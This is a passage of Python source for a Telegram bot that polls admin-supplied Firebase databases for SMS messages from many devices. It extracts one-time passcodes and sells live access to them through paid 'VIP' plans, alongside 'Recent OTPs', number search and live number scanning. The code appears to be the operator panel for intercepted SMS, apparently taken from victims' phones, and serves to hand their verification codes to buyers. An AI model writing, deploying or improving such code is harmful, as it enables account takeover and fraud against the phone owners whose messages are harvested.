        if data == "admin_refresh":
            if not is_admin: 
                return
            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard())
            return
            
        if data == "admin_list_dbs":
            if not is_admin:
                return
            if not DATABASES:
                txt = "📋 <b>No Databases Added</b>\n\nClick 'Add Firebase DB' to add one."
                await safe_edit(query, txt, reply_markup=admin_keyboard())
                return
            txt = "📋 <b>DATABASES LIST</b>\n━━━━━━━━━━━━━━━━━━\n"
            for name, url in DATABASES.items():
                txt += f"• <b>{name}</b>\n  <code>{url}</code>\n\n"
            txt += f"Total: {len(DATABASES)} databases"
            await safe_edit(query, txt, reply_markup=admin_keyboard())
            return

        if data == "admin_broadcast":
            if not is_admin: 
                return
            pending_action[chat_id] = {"action": "broadcast"}
            await query.message.reply("📢 **Broadcast Mode Active**\n\nSend the message you want to broadcast to all users:")
            return

        if data == "admin_users":
            if not is_admin: 
                return
            total = len(users_db)
            txt = f"👥 **Total Registered Users:** {total}\n\n"
            for uid, info in list(users_db.items())[:20]:
                is_u_vip = time.time() < info.get("vip_until", 0)
                txt += f"• {info.get('name')} (`{uid}`) - {'👑 VIP' if is_u_vip else 'Basic'}\n"
            await safe_edit(query, txt, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back to Admin", callback_data="admin_refresh")]]))
            return

        if data == "admin_add_firebase":
            if not is_admin: 
                return
            pending_action[chat_id] = {"action": "add_db"}
            await query.message.reply(
                "➕ <b>Add Firebase Database</b>\n━━━━━━━━━━━━━━━━━━\n"
                "Send in this format:\n\n"
                "<code>DB_Name | https://project-default-rtdb.firebaseio.com</code>\n\n"
                "Example:\n"
                "<code>My DB 1 | https://myproject-default-rtdb.firebaseio.com</code>",
                parse_mode=ParseMode.HTML
            )
            return

        if data == "admin_remove_firebase":
            if not is_admin: 
                return
            if not DATABASES:
                await query.answer("❌ No databases to remove!", show_alert=True)
                return
            db_list_str = "\n".join([f"• {name}" for name in DATABASES.keys()])
            pending_action[chat_id] = {"action": "remove_db"}
            await query.message.reply(
                f"➖ <b>Remove Database</b>\n━━━━━━━━━━━━━━━━━━\nActive Databases:\n{db_list_str}\n\nType the exact name of the database you want to remove:",
                parse_mode=ParseMode.HTML
            )
            return

        if data == "admin_delete_all_db":
            if not is_admin: 
                return
            DATABASES.clear()
            await save_data_async()
            await query.answer("🗑 All databases have been deleted!", show_alert=True)
            await safe_edit(query, admin_panel_text(bot_token), reply_markup=admin_keyboard())
            return

        devices = await get_all_devices(bot_token)
        
        if data == "home":
            user_focus.setdefault(bot_token, {}).pop(chat_id, None)
            await safe_edit(query, device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0))
            return

        if data.startswith("pg:"):
            page = int(data[3:])
            await safe_edit(query, device_list_header(devices, page), reply_markup=device_list_keyboard(devices, page))
            return

        if data == "online":
            online = [d for d in devices if d.status == "online" and len(d.numbers) > 0]
            online.sort(key=lambda d: -DEVICE_LAST_SMS_TIME.get(d.id, 0.0))
            txt = f"🟢 <b>ACTIVE ONLINE NUMBERS ({len(online)})</b>\n━━━━━━━━━━━━━━━━━━\nTop numbers are those currently receiving SMS:"
            await safe_edit(query, txt, reply_markup=online_only_keyboard(devices))
            return

        if data.startswith("sel:"):
            dev_id = data[4:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("❌ Device not found!", show_alert=True)
                return
            user_focus.setdefault(bot_token, {})[chat_id] = dev_id
            txt = f"📡 <b>LIVE NUMBER SCANNING STARTED</b> 🚀\n━━━━━━━━━━━━━━━━━━\n📱 Number/Device : <code>{device_label(device)}</code>\n⚡ Status : {device.status}"
            await safe_edit(query, txt, reply_markup=device_action_keyboard(dev_id, device.numbers))
            return

        if data.startswith("msgs:"):
            dev_id = data[5:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device:
                await query.answer("❌ Device not found!", show_alert=True)
                return
            smss = await get_device_sms(device, limit=2)
            if not smss:
                await query.answer("📭 No messages found.", show_alert=True)
                return
            
            output_blocks = []
            all_otps = []
            for idx, sms in enumerate(smss[:2], 1):
                block, otp = format_sms_block(sms, device_label(device))
                output_blocks.append(f"<b>--- Message {idx} ---</b>\n{block}")
                if otp: 
                    all_otps.append(otp)

            btns = []
            if all_otps:
                btns.append([InlineKeyboardButton(text=f"📋 Copy OTP: {all_otps[0]}", callback_data=f"cp:{all_otps[0]}")])
            btns.append([InlineKeyboardButton(text="🔄 Refresh", callback_data=f"msgs:{dev_id}"), 
                         InlineKeyboardButton(text="🔙 Back", callback_data=f"sel:{dev_id}")])
            
            await safe_edit(query, f"📩 REFRESHED MESSAGES (Last 2)\n━━━━━━━━━━━━━━━━━━\n\n" + "\n\n".join(output_blocks), 
                           reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
            return

        if data.startswith("info:"):
            dev_id = data[5:]
            device = next((d for d in devices if d.id == dev_id), None)
            if not device: 
                return
            info_text = f"ℹ️ DEVICE DETAILS\n━━━━━━━━━━━━━━━━━━\n{device.device_info}\n\n🆔 ID: <code>{device.id}</code>"
            btns = [
                [InlineKeyboardButton(text=f"📋 Copy Device ID", callback_data=f"cp:{device.id}")],
                [InlineKeyboardButton(text="🔙 Back", callback_data=f"sel:{dev_id}")]
            ]
            await safe_edit(query, info_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=btns))
            return

    except Exception as e:
        tlog(f"Callback error: {e}")

# ============================================================
# MESSAGE HANDLER
# ============================================================

@dp.message()
async def on_message_handler(message: Message, bot: Bot) -> None:
    chat_id = message.chat.id
    bot_token = bot.token
    is_main_bot = (bot_token == BOT_TOKEN)
    users_db = all_users if is_main_bot else CLONES[bot_token]["users"]
    is_admin = (chat_id in ADMIN_IDS) if is_main_bot else (chat_id == CLONES[bot_token]["creator"])

    if users_db.get(chat_id, {}).get("banned"): 
        return
    text = (message.text or message.caption or "").strip()

    if pending_action.get(chat_id, {}).get("action") == "awaiting_payment_proof":
        if message.photo:
            plan_key = pending_action.pop(chat_id).get("plan")
            plan = VIP_PLANS.get(plan_key, {"name": "VIP Access", "price": 0})
            photo_file_id = message.photo[-1].file_id
            
            user_info = message.from_user
            u_name = user_info.full_name if user_info else "Unknown"
            u_tag = f"@{user_info.username}" if user_info.username else "No Username"
            
            admin_caption = (
                f"🧾 <b>NEW VIP PAYMENT SUBMITTED!</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> {u_name} ({u_tag})\n"
                f"🆔 <b>Chat ID:</b> <code>{chat_id}</code>\n"
                f"📦 <b>Plan:</b> {plan['name']} (₹{plan['price']})\n"
                f"━━━━━━━━━━━━━━━━━━\nApprove or Reject this payment:"
            )
            
            admin_kb = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="✅ Approve", callback_data=f"vip_approve:{chat_id}:{plan_key}"),
                    InlineKeyboardButton(text="❌ Reject", callback_data=f"vip_reject:{chat_id}")
                ]
            ])
            
            for admin_id in ADMIN_IDS:
                try:
                    await bot.send_photo(
                        chat_id=admin_id,
                        photo=photo_file_id,
                        caption=admin_caption,
                        reply_markup=admin_kb,
                        parse_mode=ParseMode.HTML
                    )
                except Exception as e:
                    tlog(f"Admin Send Error: {e}")
                    
            await message.reply("✅ <b>Screenshot Received!</b>\n\nAdmin is verifying your payment. Your VIP access will be activated soon.", parse_mode=ParseMode.HTML)
            return
        else:
            await message.reply("❌ Please send the payment proof as a photo (screenshot).")
            return

    if text == "👑 Buy VIP":
        txt = "👑 <b>VIP MEMBERSHIP PLANS</b>\n━━━━━━━━━━━━━━━━━━\nSelect your VIP subscription for unlimited access:"
        await message.reply(txt, reply_markup=get_vip_plan_keyboard(), parse_mode=ParseMode.HTML)
        return

    if text == "👤 My Profile":
        u = users_db.get(chat_id, {})
        vip_ts = u.get("vip_until", 0.0)
        is_u_vip = time.time() < vip_ts
        vip_status_str = f"Active (Until: {datetime.fromtimestamp(vip_ts).strftime('%d %b %Y %I:%M %p')})" if is_u_vip else "Inactive (Buy VIP to Access)"
        await message.reply(f"👤 <b>MY PROFILE</b>\n━━━━━━━━━━━━━━━━━━\nName: {u.get('name', 'Unknown')}\nID: <code>{chat_id}</code>\n👑 VIP Status: <b>{vip_status_str}</b>", parse_mode=ParseMode.HTML)
        return

    if text == "💸 Refer & Earn":
        ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
        await message.reply(
            f"💸 <b>REFER & EARN</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Refer your friends and earn rewards!\n\n"
            f"🔗 <b>Your Referral Link:</b>\n<code>{ref_link}</code>\n\n"
            f"When someone joins using your link, you'll get a bonus!",
            parse_mode=ParseMode.HTML
        )
        return

    if is_admin and chat_id in pending_action:
        action_data = pending_action.pop(chat_id)
        action = action_data.get("action")

        if action == "broadcast":
            count = 0
            for uid in users_db.keys():
                try:
                    await message.copy_to(chat_id=uid)
                    count += 1
                except: 
                    pass
            await message.reply(f"✅ Broadcast successfully sent to {count} users!")
            return

        if action == "add_db":
            try:
                parts = text.split("|")
                if len(parts) == 2:
                    db_name, db_url = parts[0].strip(), parts[1].strip()
                    if db_name in DATABASES:
                        await message.reply(f"⚠️ Database '{db_name}' already exists! Use a different name.")
                        return
                    DATABASES[db_name] = db_url
                    await save_data_async()
                    await message.reply(f"✅ Database '{db_name}' successfully added!\n\nTotal databases: {len(DATABASES)}")
                else:
                    await message.reply("❌ Wrong format! Use:\n`DB_Name | https://project-default-rtdb.firebaseio.com`")
            except Exception as e:
                await message.reply(f"❌ Error: {e}")
            return

        if action == "remove_db":
            if text in DATABASES:
                del DATABASES[text]
                await save_data_async()
                await message.reply(f"✅ Database '{text}' has been removed!")
            else:
                await message.reply("❌ Database name not found.\n\nAvailable databases:\n" + "\n".join(DATABASES.keys()))
            return

    if pending_action.get(chat_id, {}).get("action") == "search_number":
        pending_action.pop(chat_id, None)
        query_text = re.sub(r"\D", "", text.strip())
        if not query_text:
            query_text = text.strip().lower()
            
        devices = await get_all_devices(bot_token)
        matched = []
        for d in devices:
            if any(query_text in re.sub(r"\D", "", num) or query_text in num.lower() for num in d.numbers):
                matched.append(d)
        
        if len(matched) == 1:
            target_dev = matched[0]
            user_focus.setdefault(bot_token, {})[chat_id] = target_dev.id
            txt = f"📡 <b>LIVE NUMBER SCANNING STARTED</b> 🚀\n━━━━━━━━━━━━━━━━━━\n📱 Number/Device : <code>{device_label(target_dev)}</code>\n⚡ Status : {target_dev.status}"
            await message.reply(txt, reply_markup=device_action_keyboard(target_dev.id, target_dev.numbers), parse_mode=ParseMode.HTML)
            return
        
        if not matched:
            await message.reply(f"❌ No numbers found matching: `{text}`\n\nPlease try again with a correct number.")
            return
        
        rows = [[InlineKeyboardButton(text=f"{'🟢' if d.status == 'online' else '🔴'} 📱 {' & '.join(d.numbers)}", callback_data=f"sel:{d.id}")] for d in matched[:15]]
        await message.reply(f"🔍 <b>Search Results for `{text}`:</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode=ParseMode.HTML)
        return

    if not is_vip(bot_token, chat_id):
        await send_vip_required_notice(message)
        return

    if pending_action.get(chat_id, {}).get("action") == "goto_page":
        pending_action.pop(chat_id, None)
        try:
            target_page = int(text) - 1
            devices = await get_all_devices(bot_token)
            total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
            if 0 <= target_page < total_pages:
                await message.reply(device_list_header(devices, target_page), reply_markup=device_list_keyboard(devices, target_page), parse_mode=ParseMode.HTML)
            else:
                await message.reply(f"❌ Invalid page number! Please enter between 1 and {total_pages}.")
        except ValueError:
            await message.reply("❌ Please enter a valid numeric page number.")
        return

    if text == "🟢 Active Online":
        devices = await get_all_devices(bot_token)
        online = [d for d in devices if d.status == "online" and len(d.numbers) > 0]
        online.sort(key=lambda d: -DEVICE_LAST_SMS_TIME.get(d.id, 0.0))
        txt = f"🟢 <b>ACTIVE ONLINE NUMBERS ({len(online)})</b>\n━━━━━━━━━━━━━━━━━━\nTop numbers are those currently receiving SMS:"
        await message.reply(txt, reply_markup=online_only_keyboard(devices), parse_mode=ParseMode.HTML)
        return

    if text == "🔍 Search Number":
        pending_action[chat_id] = {"action": "search_number"}
        await message.reply("🔍 <b>Search Number Mode</b>\n\nType the mobile number you want to search for:")
        return

    if text == "📱 Devices List":
        devices = await get_all_devices(bot_token)
        if not devices:
            await message.reply("❌ No devices found. Please add a Firebase database first via Admin Panel.")
            return
        await message.reply(device_list_header(devices, 0), reply_markup=device_list_keyboard(devices, 0), parse_mode=ParseMode.HTML)
        return

    if text == "📊 Bot Status":
        if not is_admin:
            return
        status = f"📊 <b>BOT STATUS</b>\n━━━━━━━━━━━━━━━━━━\n"
        status += f"🤖 Bot: @{BOT_USERNAME}\n"
        status += f"🗄 Databases: {len(DATABASES)}\n"
        status += f"👥 Total Users: {len(users_db)}\n"
        status += f"🔄 Poll Interval: {POLL_INTERVAL}s\n"
        status += f"📱 Devices Cached: {sum(len(devs) for devs in GLOBAL_DEVICE_CACHE.values())}\n"
        status += f"🔑 OTPs Tracked: {len(seen_ids)}\n"
        status += f"━━━━━━━━━━━━━━━━━━\n"
        status += f"🕐 Last Updated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
        await message.reply(status, parse_mode=ParseMode.HTML)
        return

    if text == "🛡 Admin Panel" and is_admin:
        await message.reply(admin_panel_text(bot_token), reply_markup=admin_keyboard(), parse_mode=ParseMode.HTML)
        return

    if text == "🔑 Recent OTPs":
        wait_msg = await message.reply("⏳ Fetching Recent Global OTPs...", parse_mode=ParseMode.HTML)
        devices = await get_all_devices(bot_token)
        found = []
        for d in devices:
            for sms in await get_device_sms(d, 5):
                otp = extract_otp(sms.get("body") or sms.get("message") or "")
                if otp: 
                    found.append((otp, device_label(d), sms.get("sender") or "?"))
            if len(found) >= 10: 
                break
        if not found:
            await wait_msg.edit_text("📭 No recent OTPs found.")
            return
        await wait_msg.edit_text("🔑 RECENT OTPS\n━━━━━━━━━━━━━━━━━━\n" + "".join([f"<code>{o}</code> — {l} ({s})\n" for o, l, s in found[:10]]), parse_mode=ParseMode.HTML)
        return

# ============================================================
# SMS FORWARDING
# ============================================================

async def _forward_sms(device: Device, sms: dict) -> None:
    body = sms.get("body") or sms.get("message") or sms.get("text") or ""
    if not body: 
        return
    
    sms_ts = parse_sms_timestamp(sms)
    if sms_ts > DEVICE_LAST_SMS_TIME.get(device.id, 0.0):
        DEVICE_LAST_SMS_TIME[device.id] = sms_ts

    label, otp = device_label(device), extract_otp(body)
    msg_text = auto_forward_msg(sms, label)
    kb = []
    if device.numbers: 
        kb.append([InlineKeyboardButton(text=f"📱 Copy: {device.numbers[0]}", callback_data=f"cp:{device.numbers[0]}")])
    if otp: 
        kb.append([InlineKeyboardButton(text=f"📋 Copy OTP: {otp}", callback_data=f"cp:{otp}")])
    kb.append([InlineKeyboardButton(text="📩 View Message", callback_data=f"msgs:{device.id}"), 
               InlineKeyboardButton(text="🔄 Refresh", callback_data=f"msgs:{device.id}")])
    markup = InlineKeyboardMarkup(inline_keyboard=kb)

    tasks = []
    for bot_token, chat_dict in user_focus.items():
        if bot_token != BOT_TOKEN and (bot_token not in CLONES or time.time() > CLONES[bot_token]["expiry"]): 
            continue
        bot_use = CLONES[bot_token]["bot_instance"] if bot_token != BOT_TOKEN and "bot_instance" in CLONES[bot_token] else _main_bot
        if not bot_use: 
            continue
        for cid, did in chat_dict.items():
            if did == device.id and is_vip(bot_token, cid):
                tasks.append(bot_use.send_message(cid, msg_text, reply_markup=markup, parse_mode=ParseMode.HTML))
    if tasks: 
        await asyncio.gather(*tasks, return_exceptions=True)

# ============================================================
# POLLING LOOP
# ============================================================

async def poll_single_db(tag: str, url: str) -> int:
    try:
        r_main, r_user, r_root = await asyncio.gather(
            fb_get("All_Users/sms", url), 
            fb_get("user_sms", url), 
            fb_get("sms", url)
        )
        device_map = {d.id: d for d in GLOBAL_DEVICE_CACHE.get(tag, [])}
        for bulk in (r_main, r_user, r_root):
            if not isinstance(bulk, dict): 
                continue
            for dev_id, s_dict in bulk.items():
                if not isinstance(s_dict, dict): 
                    continue
                dev = device_map.get(dev_id)
                for k, sms in s_dict.items():
                    if not isinstance(sms, dict): 
                        continue
                    sk = seen_key(dev_id, k)
                    
                    sms_ts = parse_sms_timestamp(sms)
                    if dev and sms_ts > DEVICE_LAST_SMS_TIME.get(dev.id, 0.0):
                        DEVICE_LAST_SMS_TIME[dev.id] = sms_ts

                    if sk in seen_ids: 
                        continue
                    seen_ids.add(sk)
                    if dev: 
                        asyncio.create_task(_forward_sms(dev, sms))
        return 1
    except: 
        return 0

async def poll_loop() -> None:
    global first_run
    while True:
        try:
            if DATABASES:
                for tag, url in list(DATABASES.items()):
                    try: 
                        GLOBAL_DEVICE_CACHE[tag] = await fetch_db_data(tag, url)
                    except: 
                        pass
                if first_run:
                    for tag, url in list(DATABASES.items()):
                        r = await asyncio.gather(
                            fb_get("All_Users/sms", url), 
                            fb_get("user_sms", url), 
                            fb_get("sms", url)
                        )
                        device_map = {d.id: d for tag, devs in GLOBAL_DEVICE_CACHE.items() for d in devs}
                        for bulk in r:
                            if isinstance(bulk, dict):
                                for dev_id, s_dict in bulk.items():
                                    if isinstance(s_dict, dict):
                                        dev = device_map.get(dev_id)
                                        for k, sms in s_dict.items():
                                            seen_ids.add(seen_key(dev_id, k))
                                            if isinstance(sms, dict) and dev:
                                                sms_ts = parse_sms_timestamp(sms)
                                                if sms_ts > DEVICE_LAST_SMS_TIME.get(dev_id, 0.0):
                                                    DEVICE_LAST_SMS_TIME[dev_id] = sms_ts
                    first_run = False
                    tlog("✅ Bot Engine ready! Waiting for databases...")
                else:
                    await asyncio.gather(*(poll_single_db(tag, url) for tag, url in DATABASES.items()))
            else:
                if first_run:
                    tlog("⏳ Waiting for databases to be added via Admin Panel...")
                    first_run = False
        except Exception as e:
            tlog(f"Poll loop error: {e}")
        await asyncio.sleep(POLL_INTERVAL)

# ============================================================
# MAIN FUNCTION
# ============================================================

async def main() -> None:
    global _main_bot
    
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN environment variable is required!")
        print("Set it in Render Dashboard: Environment Variables")
        return
    
    bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    _main_bot = bot
    
    tlog("🚀 Bot starting...")
    tlog(f"👥 Admin IDs: {ADMIN_IDS}")
    tlog(f"📢 Required Channels: {REQUIRED_CHANNELS_STR}")
    tlog(f"🗄 Databases: {len(DATABASES)} (Add via Admin Panel)")
    
    # Start health check server for 24/7 monitoring
    asyncio.create_task(health_check())
    
    load_data()
    asyncio.create_task(poll_loop())
    asyncio.create_task(auto_save_loop())

    try:
        await dp.start_polling(bot)
    finally:
        await bot.session.close()
        if _http_session and not _http_session.closed:
            await _http_session.close()

if __name__ == "__main__":
    asyncio.run(main())